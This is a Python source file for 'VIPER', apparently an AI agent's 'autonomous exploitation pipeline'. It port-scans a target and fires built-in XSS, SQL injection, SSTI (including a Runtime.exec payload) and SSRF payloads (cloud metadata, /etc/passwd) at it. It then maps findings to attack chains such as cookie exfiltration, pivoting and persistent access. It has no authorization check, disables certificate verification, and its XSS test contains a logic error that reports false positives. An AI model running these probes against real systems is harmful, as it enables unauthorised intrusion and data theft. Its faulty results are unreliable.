#!/usr/bin/env python3
"""
Attack Chain Automation - Autonomous Exploitation Pipeline

Chains findings together for maximum impact.
Runs end-to-end: scan → analyze → chain → exploit → report
"""

import json
import logging

logger = logging.getLogger("viper.attack_chain")
import asyncio
import socket
import ssl
import urllib.request
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from pathlib import Path
import re

from .models import Finding, Severity


@dataclass
class AttackChain:
    """A chain of vulnerabilities that combine for greater impact."""
    name: str
    findings: List[Finding]
    combined_severity: Severity
    impact: str
    steps: List[str]
    
    @property
    def chain_description(self) -> str:
        types = " + ".join([f.vuln_type for f in self.findings])
        return f"{types} → {self.impact}"


class PortScanner:
    """Fast async port scanner."""
    
    COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 
                   993, 995, 1433, 1521, 3306, 3389, 5432, 5900,
                   6379, 8000, 8080, 8443, 8888, 8889, 8899, 1999, 27017]
    
    @staticmethod
    def scan_port(host: str, port: int, timeout: float = 1.0) -> Tuple[int, bool, str]:
        """Scan single port, return (port, is_open, banner)."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            if result == 0:
                # Try to grab banner
                banner = ""
                try:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')[:200]
                except Exception as e:  # noqa: BLE001
                    pass
                sock.close()
                return (port, True, banner)
            sock.close()
        except Exception as e:  # noqa: BLE001
            pass
        return (port, False, "")
    
    @classmethod
    def scan_host(cls, host: str, ports: List[int] = None) -> Dict[int, str]:
        """Scan multiple ports, return {port: banner} for open ports."""
        ports = ports or cls.COMMON_PORTS
        open_ports = {}
        for port in ports:
            port_num, is_open, banner = cls.scan_port(host, port)
            if is_open:
                open_ports[port_num] = banner
        return open_ports


class HeaderAnalyzer:
    """Security header analysis."""
    
    SECURITY_HEADERS = {
        "Content-Security-Policy": {"required": True, "severity": Severity.MEDIUM},
        "X-Frame-Options": {"required": True, "severity": Severity.MEDIUM},
        "X-Content-Type-Options": {"required": True, "severity": Severity.LOW},
        "X-XSS-Protection": {"required": False, "severity": Severity.LOW},
        "Strict-Transport-Security": {"required": True, "severity": Severity.MEDIUM},
        "Referrer-Policy": {"required": False, "severity": Severity.LOW},
        "Permissions-Policy": {"required": False, "severity": Severity.LOW},
    }
    
    CSP_WEAKNESSES = [
        ("'unsafe-inline'", "CSP allows inline scripts", Severity.MEDIUM),
        ("'unsafe-eval'", "CSP allows eval()", Severity.MEDIUM),
        ("data:", "CSP allows data: URIs", Severity.LOW),
        ("*", "CSP has wildcard source", Severity.HIGH),
    ]
    
    @classmethod
    def fetch_headers(cls, url: str, timeout: int = 10) -> Dict[str, str]:
        """Fetch HTTP headers from URL."""
        headers = {}
        try:
            req = urllib.request.Request(url, method='HEAD')
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) VIPER-Scanner/1.0')
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                for key, value in resp.headers.items():
                    headers[key] = value
        except Exception as e:
            headers['_error'] = str(e)
        return headers
    
    @classmethod
    def analyze(cls, url: str) -> List[Finding]:
        """Analyze security headers and return findings."""
        findings = []
        headers = cls.fetch_headers(url)
        
        if '_error' in headers:
            return findings
        
        # Check missing headers
        for header, config in cls.SECURITY_HEADERS.items():
            if header not in headers and header.lower() not in [h.lower() for h in headers]:
                if config["required"]:
                    findings.append(Finding(
                        target=url,
                        vuln_type="missing_header",
                        severity=config["severity"],
                        title=f"Missing Security Header: {header}",
                        description=f"The {header} header is not set.",
                        evidence=f"Header '{header}' not found in response",
                        remediation=f"Add the {header} header with appropriate value",
                        cwe="CWE-16"
                    ))
        
        # Check CSP weaknesses
        csp = headers.get("Content-Security-Policy", headers.get("content-security-policy", ""))
        if csp:
            for weakness, desc, severity in cls.CSP_WEAKNESSES:
                if weakness in csp:
                    findings.append(Finding(
                        target=url,
                        vuln_type="weak_csp",
                        severity=severity,
                        title=f"Weak CSP: {desc}",
                        description=f"Content-Security-Policy contains {weakness}",
                        evidence=f"CSP: {csp[:200]}",
                        remediation=f"Remove {weakness} from CSP",
                        cwe="CWE-79"
                    ))
        
        # Check server disclosure
        server = headers.get("Server", headers.get("server", ""))
        if server and "/" in server:  # Has version
            findings.append(Finding(
                target=url,
                vuln_type="info_disclosure",
                severity=Severity.INFO,
                title="Server Version Disclosure",
                description=f"Server header reveals version: {server}",
                evidence=f"Server: {server}",
                remediation="Remove version from Server header",
                cwe="CWE-200"
            ))
        
        return findings


class PayloadEngine:
    """Generate and mutate payloads for various attack types."""
    
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<img src=x onerror="alert(1)">',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '{{constructor.constructor("alert(1)")()}}',  # Angular
        '${alert(1)}',  # Template literal
    ]
    
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--",
        "1' AND SLEEP(5)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "' AND '1'='1",
        "admin'--",
        "1 OR 1=1",
        "' OR ''='",
    ]
    
    SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ]
    
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0177.0.0.1",  # Octal
        "http://2130706433",  # Decimal
        "file:///etc/passwd",
    ]
    
    @classmethod
    def get_payloads(cls, attack_type: str) -> List[str]:
        """Get payloads for attack type."""
        mapping = {
            "xss": cls.XSS_PAYLOADS,
            "sqli": cls.SQLI_PAYLOADS,
            "ssti": cls.SSTI_PAYLOADS,
            "ssrf": cls.SSRF_PAYLOADS,
        }
        return mapping.get(attack_type.lower(), [])
    
    @classmethod
    def encode_payload(cls, payload: str, encoding: str) -> str:
        """Encode payload with various techniques."""
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "html":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif encoding == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        elif encoding == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        return payload


class VulnScanner:
    """Active vulnerability scanner with payload testing."""
    
    @staticmethod
    def test_xss(url: str, param: str) -> Optional[Finding]:
        """Test for reflected XSS."""
        canary = f"viper{int(datetime.now().timestamp())}"
        test_url = f"{url}?{param}={canary}"
        
        try:
            req = urllib.request.Request(test_url)
            req.add_header('User-Agent', 'VIPER-Scanner/1.0')
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                if canary in body:
                    # Reflected! Now test actual payload
                    for payload in PayloadEngine.XSS_PAYLOADS[:3]:
                        test_url2 = f"{url}?{param}={urllib.parse.quote(payload)}"
                        req2 = urllib.request.Request(test_url2)
                        with urllib.request.urlopen(req2, timeout=10, context=ctx) as resp2:
                            body2 = resp2.read().decode('utf-8', errors='ignore')
                            if payload in body2 or payload.replace('"', '&quot;') not in body2:
                                return Finding(
                                    target=url,
                                    vuln_type="xss",
                                    severity=Severity.HIGH,
                                    title=f"Reflected XSS in parameter '{param}'",
                                    description=f"Input is reflected without proper encoding",
                                    evidence=f"Payload reflected: {payload[:50]}",
                                    payload=payload,
                                    remediation="Encode output using context-appropriate encoding",
                                    cwe="CWE-79"
                                )
        except Exception as e:  # noqa: BLE001
            pass
        return None


class VulnScannerSQLi:
    """Active SQL injection scanner."""

    SQLI_PAYLOADS = [
        ("'", ["sql", "mysql", "syntax", "error", "unclosed", "unterminated"]),
        ("' OR '1'='1", ["sql", "true", "row"]),
        ("1' AND SLEEP(2)--", []),  # Time-based (handled separately)
        ("1 AND 1=2 UNION SELECT NULL--", ["null", "union"]),
    ]

    @staticmethod
    def test_sqli(url: str, param: str) -> Optional[Finding]:
        """Test for SQL injection in parameter."""
        for payload, markers in VulnScannerSQLi.SQLI_PAYLOADS:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url)
                req.add_header('User-Agent', 'VIPER-Scanner/1.0')
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                    body = resp.read().decode('utf-8', errors='ignore').lower()
                    for marker in markers:
                        if marker in body:
                            return Finding(
                                target=url,
                                vuln_type="sqli",
                                severity=Severity.CRITICAL,
                                title=f"SQL Injection in parameter '{param}'",
                                description="Parameter is vulnerable to SQL injection",
                                evidence=f"Payload '{payload}' triggered: {marker}",
                                payload=payload,
                                remediation="Use parameterized queries / prepared statements",
                                cwe="CWE-89",
                                cvss=9.8
                            )
            except Exception as e:
                logger.debug(f"SQLi probe failed for {url} param={param} payload={payload}: {e}")
        return None


class VulnScannerSSTI:
    """Active SSTI scanner."""

    SSTI_PAYLOADS = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
    ]

    @staticmethod
    def test_ssti(url: str, param: str) -> Optional[Finding]:
        """Test for SSTI in parameter."""
        for payload, expected in VulnScannerSSTI.SSTI_PAYLOADS:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url)
                req.add_header('User-Agent', 'VIPER-Scanner/1.0')
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                    body = resp.read().decode('utf-8', errors='ignore')
                    if expected in body and payload not in body:
                        return Finding(
                            target=url,
                            vuln_type="ssti",
                            severity=Severity.CRITICAL,
                            title=f"Server-Side Template Injection in '{param}'",
                            description="Template engine evaluates user input, potentially leading to RCE",
                            evidence=f"Payload '{payload}' evaluated to '{expected}'",
                            payload=payload,
                            remediation="Never pass user input directly to template engines; use sandboxed rendering",
                            cwe="CWE-1336",
                            cvss=9.8
                        )
            except Exception as e:
                logger.debug(f"SSTI probe failed for {url} param={param} payload={payload}: {e}")
        return None


class VulnScannerSSRF:
    """Active SSRF scanner."""

    @staticmethod
    def test_ssrf(url: str, param: str) -> Optional[Finding]:
        """Test for SSRF in parameter."""
        ssrf_targets = [
            ("http://127.0.0.1:22", ["ssh", "openssh"]),
            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance"]),
            ("file:///etc/passwd", ["root:"]),
        ]
        for payload, markers in ssrf_targets:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url)
                req.add_header('User-Agent', 'VIPER-Scanner/1.0')
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                    body = resp.read().decode('utf-8', errors='ignore').lower()
                    for marker in markers:
                        if marker in body:
                            return Finding(
                                target=url,
                                vuln_type="ssrf",
                                severity=Severity.HIGH,
                                title=f"Server-Side Request Forgery via '{param}'",
                                description="Server makes requests to attacker-controlled URLs",
                                evidence=f"Payload '{payload}' returned: {marker}",
                                payload=payload,
                                remediation="Validate and allowlist URLs; block internal/metadata IPs",
                                cwe="CWE-918",
                                cvss=8.6
                            )
            except Exception as e:
                logger.debug(f"SSRF probe failed for {url} param={param} payload={payload}: {e}")
        return None


class AttackChainEngine:
    """Combine findings into attack chains for maximum impact."""

    CHAIN_PATTERNS = [
        {
            "name": "XSS to Session Hijacking",
            "requires": ["xss"],
            "impact": "Account Takeover",
            "combined_severity": Severity.CRITICAL,
            "steps": [
                "1. Inject XSS payload",
                "2. Steal session cookie via document.cookie",
                "3. Exfiltrate to attacker server",
                "4. Hijack victim session"
            ]
        },
        {
            "name": "Missing Headers to Clickjacking",
            "requires": ["missing_header"],
            "header_check": "X-Frame-Options",
            "impact": "UI Redress Attack",
            "combined_severity": Severity.MEDIUM,
            "steps": [
                "1. Embed target page in malicious iframe",
                "2. Overlay invisible buttons",
                "3. Trick user into clicking",
                "4. Perform unauthorized actions"
            ]
        },
        {
            "name": "Info Disclosure + SSRF",
            "requires": ["info_disclosure", "ssrf"],
            "impact": "Internal Network Access",
            "combined_severity": Severity.CRITICAL,
            "steps": [
                "1. Identify server version/tech stack",
                "2. Use SSRF to access internal services",
                "3. Target known CVEs for disclosed version",
                "4. Pivot deeper into network"
            ]
        },
        {
            "name": "Weak CSP + XSS",
            "requires": ["weak_csp", "xss"],
            "impact": "Full XSS Exploitation",
            "combined_severity": Severity.HIGH,
            "steps": [
                "1. Identify CSP weaknesses",
                "2. Craft XSS payload that bypasses CSP",
                "3. Execute arbitrary JavaScript",
                "4. Steal data, hijack session"
            ]
        },
        {
            "name": "SQLi to Full Database Compromise",
            "requires": ["sqli"],
            "impact": "Database Takeover / Data Breach",
            "combined_severity": Severity.CRITICAL,
            "steps": [
                "1. Confirm SQL injection point",
                "2. Enumerate database structure via UNION/error-based",
                "3. Extract credentials and sensitive data",
                "4. Attempt OS command execution via INTO OUTFILE or xp_cmdshell"
            ]
        },
        {
            "name": "SSTI to Remote Code Execution",
            "requires": ["ssti"],
            "impact": "Full Server Compromise",
            "combined_severity": Severity.CRITICAL,
            "steps": [
                "1. Identify template engine (Jinja2, Twig, Freemarker, etc.)",
                "2. Craft RCE payload using engine-specific gadgets",
                "3. Execute system commands on server",
                "4. Establish persistent access"
            ]
        },
        {
            "name": "SSRF to Cloud Metadata Theft",
            "requires": ["ssrf"],
            "impact": "Cloud Account Compromise",
            "combined_severity": Severity.CRITICAL,
            "steps": [
                "1. Confirm SSRF access to internal IPs",
                "2. Query cloud metadata endpoint (169.254.169.254)",
                "3. Extract IAM role credentials",
                "4. Pivot to cloud services (S3, EC2, etc.)"
            ]
        },
        {
            "name": "SQLi + Info Disclosure Chain",
            "requires": ["sqli", "info_disclosure"],
            "impact": "Targeted Database Exploitation",
            "combined_severity": Severity.CRITICAL,
            "steps": [
                "1. Use server version info to identify DB type",
                "2. Craft DB-specific injection payloads",
                "3. Extract data using version-specific features",
                "4. Attempt privilege escalation within DB"
            ]
        },
        {
            "name": "SSRF + SQLi Internal Pivot",
            "requires": ["ssrf", "sqli"],
            "impact": "Internal Database Access",
            "combined_severity": Severity.CRITICAL,
            "steps": [
                "1. Use SSRF to reach internal database ports",
                "2. Tunnel SQL queries through SSRF",
                "3. Exfiltrate data from internal databases",
                "4. Pivot further into internal network"
            ]
        },
    ]
    
    @classmethod
    def find_chains(cls, findings: List[Finding]) -> List[AttackChain]:
        """Find attack chains from findings."""
        chains = []
        finding_types = {f.vuln_type for f in findings}
        
        for pattern in cls.CHAIN_PATTERNS:
            required = set(pattern["requires"])
            if required.issubset(finding_types):
                # Check header-specific patterns
                if "header_check" in pattern:
                    header_findings = [f for f in findings 
                                      if f.vuln_type == "missing_header" 
                                      and pattern["header_check"] in f.title]
                    if not header_findings:
                        continue
                
                relevant_findings = [f for f in findings if f.vuln_type in required]
                chains.append(AttackChain(
                    name=pattern["name"],
                    findings=relevant_findings,
                    combined_severity=pattern["combined_severity"],
                    impact=pattern["impact"],
                    steps=pattern["steps"]
                ))
        
        return chains


class ReportGenerator:
    """Generate professional vulnerability reports."""
    
    @staticmethod
    def generate_markdown(findings: List[Finding], chains: List[AttackChain], 
                         target: str) -> str:
        """Generate markdown report."""
        report = []
        report.append(f"# Vulnerability Assessment Report")
        report.append(f"\n**Target:** {target}")
        report.append(f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"**Scanner:** VIPER v1.0")
        
        # Executive Summary
        report.append("\n## Executive Summary\n")
        by_severity = {}
        for f in findings:
            by_severity.setdefault(f.severity.name, []).append(f)
        
        report.append(f"**Total Findings:** {len(findings)}")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            count = len(by_severity.get(sev, []))
            if count > 0:
                report.append(f"- {sev}: {count}")
        
        # Attack Chains
        if chains:
            report.append("\n## Attack Chains\n")
            report.append("The following vulnerabilities can be chained for greater impact:\n")
            for chain in chains:
                report.append(f"### {chain.name}")
                report.append(f"**Impact:** {chain.impact}")
                report.append(f"**Combined Severity:** {chain.combined_severity.name}")
                report.append("\n**Attack Steps:**")
                for step in chain.steps:
                    report.append(f"- {step}")
                report.append("")
        
        # Detailed Findings
        report.append("\n## Detailed Findings\n")
        for i, finding in enumerate(sorted(findings, key=lambda x: x.severity.value, reverse=True), 1):
            report.append(f"### {i}. {finding.title}")
            report.append(f"**Severity:** {finding.severity.name}")
            report.append(f"**Type:** {finding.vuln_type}")
            if finding.cwe:
                report.append(f"**CWE:** {finding.cwe}")
            report.append(f"\n**Description:** {finding.description}")
            report.append(f"\n**Evidence:**\n```\n{finding.evidence}\n```")
            if finding.payload:
                report.append(f"\n**Payload:**\n```\n{finding.payload}\n```")
            report.append(f"\n**Remediation:** {finding.remediation}")
            report.append("\n---\n")
        
        return "\n".join(report)
    
    @staticmethod
    def generate_json(findings: List[Finding], chains: List[AttackChain],
                     target: str) -> str:
        """Generate JSON report."""
        return json.dumps({
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "scanner": "VIPER v1.0",
            "findings": [f.to_dict() for f in findings],
            "attack_chains": [
                {
                    "name": c.name,
                    "impact": c.impact,
                    "severity": c.combined_severity.name,
                    "steps": c.steps
                } for c in chains
            ],
            "summary": {
                "total": len(findings),
                "critical": sum(1 for f in findings if f.severity == Severity.CRITICAL),
                "high": sum(1 for f in findings if f.severity == Severity.HIGH),
                "medium": sum(1 for f in findings if f.severity == Severity.MEDIUM),
                "low": sum(1 for f in findings if f.severity == Severity.LOW),
                "info": sum(1 for f in findings if f.severity == Severity.INFO),
            }
        }, indent=2)


class VIPER:
    """
    Main VIPER engine - Autonomous attack chain automation.
    
    Usage:
        viper = VIPER()
        report = viper.full_scan("http://target.com")
    """
    
    def __init__(self, output_dir: Path = None):
        self.output_dir = output_dir or Path("skills/hackagent/reports")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings: List[Finding] = []
        self.chains: List[AttackChain] = []
    
    def scan_ports(self, host: str, ports: List[int] = None) -> Dict[int, str]:
        """Scan ports on host."""
        print(f"[*] Scanning ports on {host}...")
        return PortScanner.scan_host(host, ports)
    
    def scan_headers(self, url: str) -> List[Finding]:
        """Scan security headers."""
        print(f"[*] Analyzing headers on {url}...")
        return HeaderAnalyzer.analyze(url)
    
    def scan_xss(self, url: str, params: List[str]) -> List[Finding]:
        """Scan for XSS in parameters."""
        findings = []
        for param in params:
            print(f"[*] Testing XSS in {param}...")
            finding = VulnScanner.test_xss(url, param)
            if finding:
                findings.append(finding)
        return findings

    def scan_sqli(self, url: str, params: List[str]) -> List[Finding]:
        """Scan for SQL injection in parameters."""
        findings = []
        for param in params:
            print(f"[*] Testing SQLi in {param}...")
            finding = VulnScannerSQLi.test_sqli(url, param)
            if finding:
                findings.append(finding)
        return findings

    def scan_ssti(self, url: str, params: List[str]) -> List[Finding]:
        """Scan for SSTI in parameters."""
        findings = []
        for param in params:
            print(f"[*] Testing SSTI in {param}...")
            finding = VulnScannerSSTI.test_ssti(url, param)
            if finding:
                findings.append(finding)
        return findings

    def scan_ssrf(self, url: str, params: List[str]) -> List[Finding]:
        """Scan for SSRF in parameters."""
        findings = []
        for param in params:
            print(f"[*] Testing SSRF in {param}...")
            finding = VulnScannerSSRF.test_ssrf(url, param)
            if finding:
                findings.append(finding)
        return findings
    
    def find_attack_chains(self, findings: List[Finding]) -> List[AttackChain]:
        """Find attack chains from findings."""
        print("[*] Analyzing attack chains...")
        return AttackChainEngine.find_chains(findings)
    
    def full_scan(self, target: str, params: List[str] = None) -> str:
        """
        Run full autonomous scan.
        
        Args:
            target: URL or host to scan
            params: Optional list of parameters to test for injection
            
        Returns:
            Markdown report
        """
        self.findings = []
        
        # Normalize target
        if not target.startswith("http"):
            target = f"http://{target}"
        
        # Extract host for port scanning
        from urllib.parse import urlparse
        parsed = urlparse(target)
        host = parsed.hostname
        
        # 1. Port scan
        open_ports = self.scan_ports(host)
        print(f"[+] Open ports: {list(open_ports.keys())}")
        
        # 2. Header analysis on each HTTP port
        http_ports = [p for p in open_ports if p in [80, 443, 8080, 8443, 8888, 8889, 8899, 1999, 3000, 5000]]
        for port in http_ports:
            scheme = "https" if port in [443, 8443] else "http"
            url = f"{scheme}://{host}:{port}"
            header_findings = self.scan_headers(url)
            self.findings.extend(header_findings)
        
        # 3. Vulnerability testing if params provided
        if params:
            xss_findings = self.scan_xss(target, params)
            self.findings.extend(xss_findings)

            sqli_findings = self.scan_sqli(target, params)
            self.findings.extend(sqli_findings)

            ssti_findings = self.scan_ssti(target, params)
            self.findings.extend(ssti_findings)

            ssrf_findings = self.scan_ssrf(target, params)
            self.findings.extend(ssrf_findings)
        
        # 4. Find attack chains
        self.chains = self.find_attack_chains(self.findings)
        if self.chains:
            print(f"[+] Found {len(self.chains)} attack chain(s)!")
        
        # 5. Generate report
        report_md = ReportGenerator.generate_markdown(self.findings, self.chains, target)
        report_json = ReportGenerator.generate_json(self.findings, self.chains, target)
        
        # Save reports
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_target = re.sub(r'[^\w\-]', '_', target)[:50]
        
        md_path = self.output_dir / f"scan_{safe_target}_{timestamp}.md"
        json_path = self.output_dir / f"scan_{safe_target}_{timestamp}.json"
        
        md_path.write_text(report_md)
        json_path.write_text(report_json)
        
        print(f"\n[+] Reports saved:")
        print(f"    - {md_path}")
        print(f"    - {json_path}")
        
        return report_md


# CLI interface
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python attack_chain.py <target> [param1,param2,...]")
        print("Example: python attack_chain.py http://localhost:8080 q,search,id")
        sys.exit(1)
    
    target = sys.argv[1]
    params = sys.argv[2].split(",") if len(sys.argv) > 2 else None
    
    viper = VIPER()
    report = viper.full_scan(target, params)
    print("\n" + "="*60)
    print(report)
